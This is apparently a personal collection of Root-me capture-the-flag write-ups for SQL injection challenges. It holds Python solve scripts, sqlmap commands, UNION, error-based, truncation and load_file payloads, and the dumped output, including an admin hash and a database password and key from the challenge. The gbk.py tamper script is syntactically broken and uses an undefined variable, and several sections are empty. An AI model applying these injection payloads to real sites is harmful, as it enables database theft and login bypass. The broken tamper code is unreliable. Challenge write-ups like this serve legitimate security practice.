# Root-me 

**[+] SQL injection - Authentication**
Retrieve admin's password
Payload: 

```
username: admin';order by 1 asc--
password: random
```

----

**[+] SQL injection - Authentication - GBK**

```bash
sqlmapp -u 'http://challenge01.root-me.org/web-serveur/ch42/' --data="login=admin*&password=123" --thread 10 --level 5 --risk 3 --encoding=GBK --dbs -v 3 --tamper=gbk.py --technique="B"
```

```python
# gbk.py
from lib.core.data import kb
from lib.core.enums import PRIORITY
import random

__priority__=PRIORITY.NORMAL
GBK_Prefix = ['%ef','%df','%bf','%a8','%8c']

def dependencies():
    pass

def tamper(payload, **kwargs):
    global GBK_Prefix
    retVal = ""
    if payload:
        first = False
        for i in payload
            payload = GBK_Prefix[random.randint(0,4)]
            if i == "'" and not first:
                retVal += GBK_Payload + "'"
                first = True
            elif i == '"' and not first:
                retVal += GBK_Payload + '"'
                first = True
            elif i == '`' and not first:
                retVal += GBK_Payload + '`'
                first = True 
            else:
                retVal += i
     
```

Or can use payload `尐' or 1=1-- -`

---

**[+] SQL injection - String**

``` python
#solve.py
import requests

session = requests.session()
url = 'http://challenge01.root-me.org/web-serveur/ch19/?action=recherche'

# retrieve tables: select sql from sqlite_master;--
payload = "'UNION SELECT null,username||password FROM users--"
data = {'recherche':payload}
r = session.post(url, data=data)
print(r.text)
```

---

**[+] SQL injection - Numeric**

``` python
#solve.py
import requests

session = requests.session()
url = 'http://challenge01.root-me.org:80/web-serveur/ch18/?action=news&news_id=1'
payload = ' union select 1,username,password from users--'

r = session.get(url+payload)
print(r.text)
```

---

**[+] SQL injection - Routed**

``` python
import requests

url = 'http://challenge01.root-me.org/web-serveur/ch49/index.php'
params = {'action':'search'}

#[+] retrieve table name
# payload = "' UNION SELECT 0x" + ("' UNION SELECT 1,table_name from information_schema.tables where table_schema=database()-- -".encode('utf-8')).hex() + "-- -"
#[+] retrieve column name
# payload = "' UNION SELECT 0x" + ("' UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name='users'-- -".encode('utf-8')).hex() + "-- -"

payload = "' UNION SELECT 0x" + ("' UNION SELECT login,password FROM users WHERE email LIKE 'admin%'-- -".encode('utf-8')).hex() + "-- -"

data = {'login':payload}
r = requests.post(url, params=params, data=data)
print(r.text)
```



---

**[+] SQL Truncation**

Table struct in response

![image](https://user-images.githubusercontent.com/68894302/182137640-9d969c82-13dd-4939-9b14-b433e41a5b09.png)

We have 2 functions:

+ new user registration
+ Enter password to login admin panel

When registering as admin, there is a message that user already exists, which only allows 12 characters. There is no cleaning input here, so if you enter more than 12 characters, the 13th character onward will be cut off.

One way to bypass is to register the admin name along with empty characters (space) followed by arbitrary characters.

[+] login: `admin       charactersbecutoff`

[+]pass: 987654321

Then login with admin user with password: 987654321

![image](https://user-images.githubusercontent.com/68894302/182139392-8e67b31c-2786-44ec-baba-31066cdc6e2a.png)



---

**[+] SQL injection - Error**

``` python
import requests

url = 'http://challenge01.root-me.org/web-serveur/ch34/'

for i in range(100):
#	payload = 'ASC,cast((SELECT column_name from information_schema.columns limit 1 offset %d) as int)' %(i)
	payload = "ASC,cast((SELECT table_name FROM information_schema.tables limit 1 offset %s) as int)" %(i)
	params = {'action':'contents','order':payload}
	r = requests.get(url, params=params)
	print(r.text[442:]) 

payload = "ASC,cast((SELECT concat(us3rn4m3_c0l,p455w0rd_c0l) FROM m3mbr35t4bl3 limit 1) as int)"
params = {'action':'contents','order':payload}
r = requests.get(url, params=params)
print(r.text)
```



---

**[+] SQL injection - Insert**





---

**[+] SQL injection - File reading**

In this challenge we use function load_file(filename) to read file through the SELECT query of sql.

File we need to read is **`/challenge/web-serveur/ch31/index.php`** -> convert to hex: `0x2F6368616C6C656E67652F7765622D736572766575722F636833312F696E6465782E706870`

Query:

[+] `?action=members&id=-1+union+select+1,2,3,@@version--`

```
 ID : 1<br/>
 Username : 2<br/>
 Email : 10.3.34-MariaDB-0ubuntu0.20.04.1 <br/>

```

[+] `?action=members&id=-1+union+select+1,2,3,(select+table_name+from+information_schema.tables+where+table_schema=database())-- `

``` 
ID : 1<br/>
Username : 2<br/>
Email : member<br/>
```

[+] `?action=members&id=-1+union+select+1,2,3,(select+column_name+from+information_schema.columns+where+table_name=0x6D656D626572)--`

``` 
Subquery returns more than 1 row
```

[+] `?action=members&id=-1+union+select+1,2,3,(select+group_concat(column_name)+from+information_schema.columns+where+table_name=0x6D656D626572)--`

```
ID : 1<br/>
Username : 2<br/>
Email : member_id,member_login,member_password,member_email <br/>
```

[+]`?action=members&id=-1+union+select+1,2,3,(select+group_concat(member_id,0x20,member_login,0x20,member_password,0x20,member_email)+from+member)--`

```
ID : 1<br/>
Username : 2<br/>
Email : 1 admin VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA== admin@super-secure-webapp.org<br
```

[+] `?action=members&id=-1+union+select+1,2,3,(select+load_file(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870))--`

``` php
<?php
define('SQL_HOST',      '/var/run/mysqld/mysqld3-web-serveur-ch31.sock');
define('SQL_DB',        'c_webserveur_31');
define('SQL_LOGIN',     'c_webserveur_31');
define('SQL_P',         'dOJLsrbyas3ZdrNqnhx');

function stringxor($o1, $o2) {
    $res = '';
    for($i=0;$i<strlen($o1);$i++)
        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        
    return $res;
}

$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
...
...
$pass = sha1($_POST['password']);
...
...
if($pass == stringxor($key, base64_decode($data['member_password']))){
   // authentication success
   print "<p>Authentication success !!</p>";
   if ($user == "admin")
      print "<p>Yeah !!! You're admin ! Use this password to complete this challenge.
```

stringxor($key,base64_decode('VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==)')

--> hash passwd 

From hash pass -> pass using decrypt sha1 algth

---

**[+] NoSQL injection - Blind**





---

**[+] SQL injection - Blind**





---

**[+] SQL injection - Time based**





---

**[+] SQL injection - Filter bypass**